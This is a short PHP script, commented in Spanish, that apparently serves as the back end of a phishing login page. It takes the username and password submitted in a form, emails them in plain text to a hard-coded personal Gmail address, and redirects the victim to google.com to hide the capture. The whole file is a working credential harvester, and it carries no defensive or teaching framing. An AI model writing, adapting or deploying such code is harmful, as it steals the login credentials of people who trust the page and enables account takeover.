<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Obtener los datos del formulario
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Configuración del correo
    $to = "luisitoo203023@gmail.com"; // Dirección de correo de destino
    $subject = "Datos del formulario de login";
    $message = "Usuario: " . $username . "\nContraseña: " . $password;
    $headers = "From: noreply@tu_dominio.com"; // Reemplaza con tu dominio

    // Enviar el correo
    if (mail($to, $subject, $message, $headers)) {
        // Redireccionar a google.com después de enviar el correo
        header("Location: https://www.google.com");
        exit();
    } else {
        echo "Error al enviar el correo.";
    }
} else {
    echo "Método de solicitud no válido.";
}
?>
